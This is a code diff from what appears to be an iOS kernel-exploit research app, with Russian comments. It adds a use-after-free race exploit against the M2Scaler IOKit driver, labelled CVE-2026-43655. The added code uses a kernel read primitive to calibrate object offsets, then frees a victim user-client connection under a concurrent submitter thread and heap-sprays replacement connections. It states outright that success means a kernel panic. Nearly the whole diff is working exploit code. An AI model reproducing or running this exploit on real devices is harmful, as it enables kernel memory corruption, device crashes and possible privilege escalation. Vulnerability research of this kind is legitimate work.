@@ -3783,6 +3783,390 @@ static void kpExp13DebugWalk(NSMutableString *r, const char *tag, uint64_t ttep,
     return r;
 }
 
+#pragma mark - M2Scaler teardown UAF, calibration-first (CVE-2026-43655)
+
+// M2T: вариант teardown-UAF с калибровкой оффсетов на живом железе.
+// Отличия от m2ScalerUafReport (тот — чистый PoC-порт):
+//   (1) фаза A ПЕРЕД гонкой: kread-дамп живого IOSurfaceAcceleratorClient
+//       (18.6: размер 0x168, op-структура M2ScalerCSCRequest 0x21c0 — оффсеты
+//       отличаются от 26.4-билда оригинального PoC) и цепочка scheduler;
+//   (2) оффсет credit калибруется чтением после sel 10 (статика 18.6 из
+//       bug-hunt: sel 10 пишет [client+0x148]; PoC 26.4 имел per_client+0x158);
+//   (3) параллельный submitter-тред на ВТОРОМ коннекшене гонит scheduler ВО
+//       ВРЕМЯ close victim'а (оригинал ждал следующего цикла от SpringBoard) —
+//       гонка идёт прямо по teardown, а не post-factum.
+// ДЕСТРУКТИВНО: успех = паника ядра. Каждая строка fsync'ится в
+// Documents/kexproof-m2teardown.txt + kexproof-live.log (переживают ребут).
+
+// Live-запись M2T-стадий: паника не сотрёт готовое (паттерн kpGartLive).
+static BOOL gM2TLive = NO;
+static void kpM2TLive(NSString *line)
+{
+    if (!gM2TLive) return;
+    // os_log → device syslog по USB в реальном времени — паника ничего не забирает.
+    os_log_error(OS_LOG_DEFAULT, "[M2T] %{public}s", [line UTF8String]);
+    extern void KPLogDirect(const char *);
+    KPLogDirect([line UTF8String]); // зеркало в kexproof-live.log (переживает ребут)
+    NSString *p = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents/kexproof-m2teardown.txt"];
+    NSFileHandle *h = [NSFileHandle fileHandleForWritingAtPath:p];
+    NSData *d = [[line stringByAppendingString:@"\n"] dataUsingEncoding:NSUTF8StringEncoding];
+    if (!h) { [d writeToFile:p atomically:NO]; return; }
+    [h seekToEndOfFile];
+    [h writeData:d];
+    [h synchronizeFile];   // fsync КАЖДОЙ строки — паника не сожрёт page cache
+    [h closeFile];
+}
+
+static void kpM2TNote(NSMutableString *r, NSString *line)
+{
+    kpNote(r, line);   // в отчёт + общий live-лог
+    kpM2TLive(line);   // + fsync-файл этого эксперимента
+}
+
+// kernel VA userClient'а коннекшена через наш ipc table (цепочка как в
+// m2ScalerUafReport: proc → proc_ro → task → itk_space → is_table (SMR)).
+static uint64_t kpM2TClientVA(NSMutableString *r, uint64_t isTable, io_connect_t conn, NSString *tag)
+{
+    if (!isTable || conn == IO_OBJECT_NULL) return 0;
+    uint64_t eVA = isTable + (uint64_t)sizeof_ipc_entry * (conn >> 8);
+    uint64_t oRaw = 0, kRaw = 0;
+    if (!kpRead(eVA + off_ipc_entry_ie_object, &oRaw, 8, "m2t ie_object", r)) return 0;
+    uint64_t pVA = kp_untag_ptr(oRaw);
+    if (!kpLooksLikeKernelPointer(pVA)) return 0;
+    if (!kpRead(pVA + off_ipc_port_ip_kobject, &kRaw, 8, "m2t ip_kobject", r)) return 0;
+    uint64_t cVA = kp_untag_ptr(kRaw);
+    if (!kpLooksLikeKernelPointer(cVA)) {
+        kpM2TNote(r, [NSString stringWithFormat:@"    %@: kobj не kernel VA (%#llx)", tag, (unsigned long long)kRaw]);
+        return 0;
+    }
+    return cVA;
+}
+
+// Дамп ненулевых qword'ов объекта с diff против предыдущего снапшота (prev
+// обновляется на месте; *CHANGED* маркирует изменившиеся поля). Так оффсеты
+// 18.6 узнаются эмпирически, а не гаданием по 26.4.
+static void kpM2TDumpDiff(NSMutableString *r, uint64_t va, uint32_t size, NSString *tag, uint8_t *prev)
+{
+    uint8_t cur[0x400];
+    if (size > sizeof(cur)) size = sizeof(cur);
+    if (!kpLooksLikeKernelPointer(va)) {
+        kpM2TNote(r, [NSString stringWithFormat:@"    %@: %#llx не kernel VA — пропуск", tag, (unsigned long long)va]);
+        return;
+    }
+    memset(cur, 0, sizeof(cur));
+    if (!kpRead(va, cur, size, "m2t obj dump", r)) return;
+    kpM2TNote(r, [NSString stringWithFormat:@"    %@ @ %#llx (%#x байт):", tag, (unsigned long long)va, size]);
+    int shown = 0;
+    for (uint32_t o = 0; o + 8 <= size && shown < 96; o += 8) {
+        uint64_t q = 0, p = 0;
+        memcpy(&q, cur + o, 8);
+        memcpy(&p, prev + o, 8);
+        memcpy(prev + o, &q, 8);
+        if (!q && q == p) continue;   // ноль и не менялся — шум
+        kpM2TNote(r, [NSString stringWithFormat:@"      +0x%03x: %#018llx%@", o, (unsigned long long)q,
+                      (q != p) ? @"  *CHANGED*" : @""]);
+        shown++;
+    }
+}
+
+// Параллельный submitter: гонит async-опы (sel 1, TSD+0x008=1) на своём
+// коннекшене, пока main-тред делает close/spray — scheduler крутится во время
+// teardown'а victim'а, а не после него.
+static _Atomic bool gM2TStop = false;
+static _Atomic uint64_t gM2TSubmits = 0;
+typedef struct { io_connect_t conn; uint32_t srcID; uint32_t dstID; } KPM2TDriverArgs;
+static void *kpM2TDriverMain(void *arg)
+{
+    KPM2TDriverArgs *a = (KPM2TDriverArgs *)arg;
+    uint8_t tsd[KP_M2_TSD_SIZE];
+    memset(tsd, 0, sizeof(tsd));
+    *(uint32_t *)(tsd + 0x000) = a->srcID;   // +0x000 srcID u32
+    *(uint32_t *)(tsd + 0x004) = a->dstID;   // +0x004 dstID u32
+    *(uint64_t *)(tsd + 0x008) = 1;          // +0x008 async u64
+    while (!atomic_load(&gM2TStop)) {
+        IOConnectCallMethod(a->conn, 1, NULL, 0, tsd, sizeof(tsd), NULL, NULL, NULL, NULL);
+        atomic_fetch_add(&gM2TSubmits, 1);
+    }
+    return NULL;
+}
+
++ (NSString *)m2TeardownUafReport
+{
+    NSMutableString *r = [NSMutableString string];
+    [[NSFileManager defaultManager] removeItemAtPath:[NSHomeDirectory() stringByAppendingPathComponent:@"Documents/kexproof-m2teardown.txt"] error:nil];
+    gM2TLive = YES;
+    kpM2TNote(r, @"=== M2Scaler teardown UAF, calibration-first (CVE-2026-43655) ===");
+    kpM2TNote(r, @"!!! ДЕСТРУКТИВНО: успех = паника ядра. Каждая строка fsync'нута в Documents/kexproof-m2teardown.txt !!!");
+    kpM2TNote(r, @"Фаза A: калибровка 18.6-оффсетов на живом клиенте (kread-only, безопасно).");
+    kpM2TNote(r, @"Фаза B: victim credit=0xDEAD0001 + 50 async → close ПОД параллельным submitter'ом → спрей 0xBEEF0002.");
+
+    if (!gPrimitives.kreadbuf) {
+        kpM2TNote(r, @"KRW не жив — сначала эксплойт. SKIP (гонка без калибровки = слепая).");
+        gM2TLive = NO;
+        return r;
+    }
+
+    // ---------------- сервис + victim ----------------
+    errno = 0;
+    io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
+                                                   IOServiceMatching("AppleM2ScalerCSCDriver"));
+    if (!svc) {
+        kpM2TNote(r, [NSString stringWithFormat:@"  IOServiceGetMatchingService: пусто (errno=%d %s) — драйвер не виден из sandbox",
+                      errno, errno ? strerror(errno) : "-"]);
+        kpM2TNote(r, @"=== M2T SKIP: сервис не найден ===");
+        gM2TLive = NO;
+        return r;
+    }
+    io_connect_t victim = IO_OBJECT_NULL;
+    IOReturn kr = IOServiceOpen(svc, mach_task_self(), 0, &victim);
+    kpM2TNote(r, [NSString stringWithFormat:@"  IOServiceOpen(victim, type 0): conn=0x%x kr=0x%x (%s)",
+                  victim, kr, mach_error_string(kr)]);
+    if (kr != KERN_SUCCESS || victim == IO_OBJECT_NULL) {
+        kpM2TNote(r, @"  open отклонён sandbox'ом — SKIP");
+        IOObjectRelease(svc);
+        gM2TLive = NO;
+        return r;
+    }
+
+    // ---------------- is_table цепочка (как в m2ScalerUafReport) ----------------
+    uint64_t isTable = 0;
+    uint64_t selfProc = [self findProcByCommName:getprogname() log:r];
+    if (!selfProc) selfProc = [self findProcByCommName:"KexProof" log:r];
+    uint64_t pr = 0, tk = 0, spc = 0, tb = 0;
+    if (selfProc &&
+        kpRead(selfProc + koffsetof(proc, proc_ro), &pr, 8, "m2t proc_ro", r) &&
+        kpRead(kp_untag_ptr(pr) + off_proc_ro_pr_task, &tk, 8, "m2t task", r) &&
+        kpRead(kp_untag_ptr(tk) + off_task_itk_space, &spc, 8, "m2t itk_space", r) &&
+        kpRead(kp_untag_ptr(spc) + off_ipc_space_is_table, &tb, 8, "m2t is_table", r)) {
+        isTable = (koffsetof(ipc_space, table_uses_smr) && smr_base && t1sz_boot)
+                  ? kp_untag_ptr(kpSMRDecode(tb)) : kp_untag_ptr(tb);
+    }
+    kpM2TNote(r, [NSString stringWithFormat:@"  is_table=%#llx %@", (unsigned long long)isTable,
+                  isTable ? @"" : @"— не разрешена, калибровка невозможна, SKIP"]);
+    if (!isTable) {
+        IOServiceClose(victim);
+        IOObjectRelease(svc);
+        gM2TLive = NO;
+        return r;
+    }
+
+    uint64_t victimVA = kpM2TClientVA(r, isTable, victim, @"victim");
+    kpM2TNote(r, [NSString stringWithFormat:@"  victim IOSurfaceAcceleratorClient @ %#llx (18.6: размер класса 0x168)",
+                  (unsigned long long)victimVA]);
+    if (!victimVA) {
+        IOServiceClose(victim);
+        IOObjectRelease(svc);
+        gM2TLive = NO;
+        return r;
+    }
+
+    // ================= ФАЗА A: калибровка оффсетов 18.6 =================
+    kpM2TNote(r, @"--- ФАЗА A: калибровка (всё kread-only, драйвер почти не тронут) ---");
+    uint8_t clientSnap[0x400];
+    memset(clientSnap, 0, sizeof(clientSnap));
+    kpM2TDumpDiff(r, victimVA, 0x168, @"A1 client baseline (сразу после open)", clientSnap);
+
+    // Цепочка scheduler (статика 18.6 из bug-hunt раунда 2: submit sel 1 читает
+    // [UC+0xe8] → объект → [тот+0xb8] = scheduler (IOAsynchronousScheduler, 0x2c50)).
+    uint64_t provRaw = 0, schedRaw = 0;
+    uint64_t provVA = 0, schedVA = 0;
+    if (kpRead(victimVA + 0xe8, &provRaw, 8, "m2t client+0xe8", r)) {
+        provVA = kp_untag_ptr(provRaw);
+        kpM2TNote(r, [NSString stringWithFormat:@"  A2 [client+0xe8] = %#llx %@", (unsigned long long)provRaw,
+                      kpLooksLikeKernelPointer(provVA) ? @"— kernel ptr, дамплю:" : @"— не kernel ptr, цепочка scheduler тут не лежит"]);
+        if (kpLooksLikeKernelPointer(provVA)) {
+            uint8_t provSnap[0x400];
+            memset(provSnap, 0, sizeof(provSnap));
+            kpM2TDumpDiff(r, provVA, 0x100, @"A2 [client+0xe8] объект", provSnap);
+            if (kpRead(provVA + 0xb8, &schedRaw, 8, "m2t prov+0xb8", r)) {
+                schedVA = kp_untag_ptr(schedRaw);
+                kpM2TNote(r, [NSString stringWithFormat:@"  A3 [prov+0xb8] = %#llx %@", (unsigned long long)schedRaw,
+                              kpLooksLikeKernelPointer(schedVA) ? @"— kernel ptr (scheduler-кандидат):" : @"— не kernel ptr"]);
+            }
+        }
+    }
+    uint8_t schedSnap[0x400];
+    memset(schedSnap, 0, sizeof(schedSnap));
+    if (schedVA) kpM2TDumpDiff(r, schedVA, 0x100, @"A3 scheduler baseline", schedSnap);
+
+    // A4: оффсет credit — маркер 0xCAFEBABE через sel 10, diff клиента покажет,
+    // куда он лёг. Статика 18.6 предсказывает [client+0x148]; PoC 26.4 имел +0x158.
+    {
+        uint8_t s10[0x18];
+        memset(s10, 0, sizeof(s10));
+        *(uint32_t *)s10 = 0xCAFEBABE;
+        uint64_t sc[3] = {0, 0, 0};
+        kern_return_t ckr = IOConnectCallMethod(victim, 10, sc, 3, s10, 0x18, NULL, NULL, NULL, NULL);
+        kpM2TNote(r, [NSString stringWithFormat:@"  A4 sel 10 credit=0xCAFEBABE: kr=0x%x — ищу маркер в клиенте:", ckr]);
+    }
+    uint32_t creditOff = 0;
+    {
+        uint8_t buf[0x200];
+        memset(buf, 0, sizeof(buf));
+        if (kpRead(victimVA, buf, sizeof(buf), "m2t client after credit", r)) {
+            for (uint32_t o = 0; o + 4 <= sizeof(buf); o += 4) {
+                uint32_t v = 0;
+                memcpy(&v, buf + o, 4);
+                if (v == 0xCAFEBABE) {
+                    creditOff = o;
+                    kpM2TNote(r, [NSString stringWithFormat:@"    credit-маркер 0xCAFEBABE найден @ client+0x%03x", o]);
+                }
+            }
+            if (!creditOff)
+                kpM2TNote(r, @"    маркер НЕ найден в первых 0x200 — sel 10 пишет не в клиента (или kr!=0 выше)");
+        }
+    }
+    kpM2TNote(r, [NSString stringWithFormat:@"  A4 вердикт: credit offset на этом железе = %#x (racesan предсказывал 0x148, PoC(26.4) 0x158)",
+                  creditOff]);
+
+    // A5: один async-оп на victim'е → diff scheduler'а: видно, куда ложатся
+    // записи (count/list head/tail). Так узнаём op-entry linkage оффсеты.
+    NSDictionary *sp5 = @{(__bridge id)kIOSurfaceWidth:@(32), (__bridge id)kIOSurfaceHeight:@(32),
+                          (__bridge id)kIOSurfaceBytesPerElement:@(4), (__bridge id)kIOSurfacePixelFormat:@(0x42475241)};
+    IOSurfaceRef srcS = IOSurfaceCreate((__bridge CFDictionaryRef)sp5);
+    IOSurfaceRef dstS = IOSurfaceCreate((__bridge CFDictionaryRef)sp5);
+    if (!srcS || !dstS) {
+        kpM2TNote(r, @"  IOSurfaceCreate NULL — SKIP (драйвер не тронут)");
+        if (srcS) CFRelease(srcS);
+        if (dstS) CFRelease(dstS);
+        IOServiceClose(victim);
+        IOObjectRelease(svc);
+        gM2TLive = NO;
+        return r;
+    }
+    uint32_t srcID = IOSurfaceGetID(srcS);
+    uint32_t dstID = IOSurfaceGetID(dstS);
+    // По PoC поверхности не освобождаются до конца прогона (async-опы по ID).
+    kpM2TNote(r, [NSString stringWithFormat:@"  IOSurface 32x32 BGRA: srcID=%u dstID=%u", srcID, dstID]);
+
+    uint8_t tsdBase[KP_M2_TSD_SIZE];
+    memset(tsdBase, 0, sizeof(tsdBase));
+    *(uint32_t *)(tsdBase + 0x000) = srcID;
+    *(uint32_t *)(tsdBase + 0x004) = dstID;
+
+    kern_return_t bkr = IOConnectCallMethod(victim, 1, NULL, 0, tsdBase, KP_M2_TSD_SIZE, NULL, NULL, NULL, NULL);
+    kpM2TNote(r, [NSString stringWithFormat:@"  A5 sync baseline (sel 1): kr=0x%x (%s)", bkr, mach_error_string(bkr)]);
+    if (schedVA) kpM2TDumpDiff(r, schedVA, 0x100, @"A5 scheduler после sync baseline", schedSnap);
+    {
+        uint8_t tsd[KP_M2_TSD_SIZE];
+        memcpy(tsd, tsdBase, KP_M2_TSD_SIZE);
+        *(uint64_t *)(tsd + 0x008) = 1;
+        kern_return_t akr = IOConnectCallMethod(victim, 1, NULL, 0, tsd, KP_M2_TSD_SIZE, NULL, NULL, NULL, NULL);
+        kpM2TNote(r, [NSString stringWithFormat:@"  A5 один async-оп (sel 1, TSD+8=1): kr=0x%x", akr]);
+    }
+    if (schedVA) kpM2TDumpDiff(r, schedVA, 0x100, @"A5 scheduler после 1 async (смотри *CHANGED* — там живут записи)", schedSnap);
+    kpM2TDumpDiff(r, victimVA, 0x168, @"A5 client после 1 async", clientSnap);
+
+    // ================= ФАЗА B: гонка =================
+    kpM2TNote(r, @"--- ФАЗА B: teardown race (паника возможна в любой момент) ---");
+
+    // Параллельный submitter на ВТОРОМ коннекшене — scheduler крутится во время close.
+    io_connect_t driver = IO_OBJECT_NULL;
+    kern_return_t dkr = IOServiceOpen(svc, mach_task_self(), 0, &driver);
+    kpM2TNote(r, [NSString stringWithFormat:@"  B0 driver-коннекшен: conn=0x%x kr=0x%x", driver, dkr]);
+    if (dkr == KERN_SUCCESS && driver != IO_OBJECT_NULL) {
+        uint8_t s10[0x18];
+        memset(s10, 0, sizeof(s10));
+        *(uint32_t *)s10 = 0xBEEF0002;
+        uint64_t sc[3] = {0, 0, 0};
+        IOConnectCallMethod(driver, 10, sc, 3, s10, 0x18, NULL, NULL, NULL, NULL);
+    }
+
+    // B1: victim credit + 50 async-опов
+    {
+        uint8_t s10[0x18];
+        memset(s10, 0, sizeof(s10));
+        *(uint32_t *)s10 = 0xDEAD0001;
+        uint64_t sc[3] = {0, 0, 0};
+        kern_return_t ckr = IOConnectCallMethod(victim, 10, sc, 3, s10, 0x18, NULL, NULL, NULL, NULL);
+        kpM2TNote(r, [NSString stringWithFormat:@"  B1 victim credit=0xDEAD0001: kr=0x%x", ckr]);
+    }
+    if (creditOff) {
+        uint32_t chk = 0;
+        if (kpRead(victimVA + creditOff, &chk, 4, "m2t credit verify", r))
+            kpM2TNote(r, [NSString stringWithFormat:@"    kread client+%#x = %#x %@", creditOff, chk,
+                          chk == 0xDEAD0001 ? @"— маркер на месте (калибровка верна)" : @"— НЕ совпал, калибровка мимо"]);
+    }
+    int asyncOK = 0;
+    for (int i = 0; i < 50; i++) {
+        uint8_t tsd[KP_M2_TSD_SIZE];
+        memcpy(tsd, tsdBase, KP_M2_TSD_SIZE);
+        *(uint64_t *)(tsd + 0x008) = 1;
+        if (IOConnectCallMethod(victim, 1, NULL, 0, tsd, KP_M2_TSD_SIZE, NULL, NULL, NULL, NULL) == KERN_SUCCESS) asyncOK++;
+    }
+    kpM2TNote(r, [NSString stringWithFormat:@"  B1 async-опы victim: %d/50 OK — записи с credit=0xDEAD0001 в куче scheduler'а", asyncOK]);
+
+    // B2: submitter стартует ДО close — гонка идёт по живому teardown'у.
+    gM2TSubmits = 0;
+    atomic_store(&gM2TStop, false);
+    KPM2TDriverArgs dargs = { driver, srcID, dstID };
+    pthread_t dth;
+    BOOL driverRuns = (dkr == KERN_SUCCESS && driver != IO_OBJECT_NULL && pthread_create(&dth, NULL, kpM2TDriverMain, &dargs) == 0);
+    kpM2TNote(r, [NSString stringWithFormat:@"  B2 submitter-тред: %@ (гонит async на driver-conn во время close)",
+                  driverRuns ? @"запущен" : @"НЕ запущен — close идёт без гонки (слабее)"]);
+
+    // B3: teardown victim'а под гонящим scheduler'ом
+    kpM2TNote(r, @"  B3 IOServiceClose(victim) — точка невозврата (per_client 0x170 + ops освобождаются, записи scheduler'а висят)");
+    kern_return_t ckr = IOServiceClose(victim);
+    kpM2TNote(r, [NSString stringWithFormat:@"  B3 IOServiceClose: kr=0x%x — victim освобождён; submitter уже сделал %llu опов",
+                  ckr, (unsigned long long)atomic_load(&gM2TSubmits)]);
+
+    // B4: спрей 50 коннекшенов (credit=0xBEEF0002), НЕ закрываем — держим слот занятым.
+    io_connect_t spray[50];
+    int sprayOK = 0;
+    for (int i = 0; i < 50; i++) {
+        spray[i] = IO_OBJECT_NULL;
+        kern_return_t skr = IOServiceOpen(svc, mach_task_self(), 0, &spray[i]);
+        if (skr == KERN_SUCCESS && spray[i] != IO_OBJECT_NULL) {
+            sprayOK++;
+            uint8_t s10[0x18];
+            memset(s10, 0, sizeof(s10));
+            *(uint32_t *)s10 = 0xBEEF0002;
+            uint64_t sc[3] = {0, 0, 0};
+            IOConnectCallMethod(spray[i], 10, sc, 3, s10, 0x18, NULL, NULL, NULL, NULL);
+        }
+    }
+    kpM2TNote(r, [NSString stringWithFormat:@"  B4 спрей: %d/50 открыто, credit=0xBEEF0002 у каждого", sprayOK]);
+
+    // B5: слот victim'а после спрея — кто-то занял? (kread по старому VA:
+    // freed/reused память; чтение freed zone-объекта безопасно — он в зоне)
+    kpM2TDumpDiff(r, victimVA, 0x168, @"B5 слот victim после спрея (переиспользован?)", clientSnap);
+    if (creditOff) {
+        uint32_t chk = 0;
+        if (kpRead(victimVA + creditOff, &chk, 4, "m2t slot credit", r))
+            kpM2TNote(r, [NSString stringWithFormat:@"    slot victim: credit-поле = %#x (%@)", chk,
+                          chk == 0xDEAD0001 ? @"стоит victim-маркер — слот не переиспользован" :
+                          chk == 0xBEEF0002 ? @"стоит spray-маркер — UAF-слот занят спреем!" : @"перезаписан чем-то иным"]);
+    }
+
+    // B6: гоним scheduler: 60 раундов × спрей + submitter всё это время крутится.
+    kpM2TNote(r, @"  B6 60 раундов × 50 async-опов на спрее + submitter крутится (паника возможна в любой момент)");
+    for (int round = 0; round < 60; round++) {
+        for (int i = 0; i < sprayOK && i < 50; i++) {
+            if (spray[i] != IO_OBJECT_NULL) {
+                uint8_t tsd[KP_M2_TSD_SIZE];
+                memcpy(tsd, tsdBase, KP_M2_TSD_SIZE);
+                *(uint64_t *)(tsd + 0x008) = 1;
+                IOConnectCallMethod(spray[i], 1, NULL, 0, tsd, KP_M2_TSD_SIZE, NULL, NULL, NULL, NULL);
+            }
+        }
+        if (round % 10 == 0)
+            kpM2TNote(r, [NSString stringWithFormat:@"  раунд %d/60 — живы (submitter: %llu опов)", round,
+                          (unsigned long long)atomic_load(&gM2TSubmits)]);
+        usleep(100000);
+    }
+
+    atomic_store(&gM2TStop, true);
+    if (driverRuns) pthread_join(dth, NULL);
+    kpM2TNote(r, [NSString stringWithFormat:@"  submitter остановлен (%llu опов всего)", (unsigned long long)atomic_load(&gM2TSubmits)]);
+
+    kpM2TNote(r, @"--- 60 раундов завершены, паники не было — баг не сработал в этом прогоне, повторить ---");
+    kpM2TNote(r, @"Паника ПОСЛЕ возврата отчёта тоже считается: весь ход в kexproof-m2teardown.txt на диске. Чтение паник-лога: x9=0xBEEF0002 → UAF CONFIRMED; x9=0xDEAD0001 → stale entry victim'а.");
+    IOObjectRelease(svc);
+    gM2TLive = NO;
+    return r;
+}
+
 #pragma mark - HID FastPath UAF (CVE-2026-28992)
 
 // close (sel1) drops provider state unlocked; copyEvent (sel2) calls into it
